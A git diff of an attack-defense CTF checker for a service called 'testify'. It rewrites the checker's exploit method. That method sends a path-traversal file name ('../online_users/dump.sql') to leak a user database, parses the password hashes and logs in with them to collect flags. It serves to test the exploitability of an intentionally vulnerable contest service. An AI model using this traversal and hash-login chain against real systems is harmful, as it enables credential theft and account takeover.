@@ -45,6 +45,7 @@ class testifyChecker(BaseChecker):
     flag_variants = 1
     noise_variants = 1
     havoc_variants = 5
+    exploit_variants = 1
     service_name = "testify"
     port = 6597  # The port will automatically be picked up as default by self.connect and self.http.
 
@@ -244,50 +245,44 @@ class testifyChecker(BaseChecker):
 
 
     def exploit(self):
-        """
-        This method was added for CI purposes for exploits to be tested.
-        Will (hopefully) not be called during actual CTF.
-        :raises EnoException on Error
-        :return This function can return a result if it wants
-                If nothing is returned, the service status is considered okay.
-                The preferred way to report Errors in the service is by raising an appropriate EnoException
-        """
-        filename = '../online_users/dump.sql'
-        profile = get_profile()
-        username = profile['username']
-        password = get_random_string()
+        if self.variant_id > 0:
+            raise EnoException("Wrong variant_id provided")
+        else:
+            filename = '../online_users/dump.sql'
+            profile = get_profile()
+            username = profile['username']
+            password = profile['password']
 
-        self.register(profile['username'], password)
+            self.register(username, password)
 
-        app_id = self.make_appointment(self.flag, profile['lastname'], filename, profile['date'], profile['time'],
-                                       profile['file'])
-        route = '/get_id' + str(app_id)
+            app_id = self.make_appointment(profile['prename'], profile['lastname'], filename, profile['date'],
+                                           profile['time'], profile['file'])
+            route = '/get_id' + str(app_id)
 
-        kwargs = {
-            'allow_redirects': True
-        }
+            kwargs = {
+                'allow_redirects': True
+            }
 
-        res = self.http_get(route, **kwargs)
-        sql_string = res.content[27:-2].decode('ascii')
-        user_list = tuple_string_to_list(sql_string)
-        tested = False
-        for i in user_list:
-            user = (i[1])[1:-1]
-            hash = (i[2])[2:]
-            if user == username:
+            res = self.http_get(route, **kwargs)
+            sql_string = res.content[27:-2].decode('ascii')
+            user_list = tuple_string_to_list(sql_string)
+            search_string = ""
+            for i in user_list:
+                user = (i[1])[1:-1]
+                hash = (i[2])[2:]
                 kwargs2 = {
                     'data': {
                         'username': user,
                         'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
                         'login': 'signin'
-                    }
+                    },
+                    'allow_redirects': True
                 }
-
                 res2 = self.http_post('/login', **kwargs2)
-                assert_in(self.flag, res2.text, "Resulting flag was found to be incorrect")
-                tested = True
-        if not tested:
-            raise BrokenServiceException("flag not found")
+                search_string += res2.text
+            if not self.search_flag(search_string):
+                raise BrokenServiceException("Resulting flag was found to be incorrect")
+
 
 
 app = testifyChecker.service  # This can be used for uswgi.
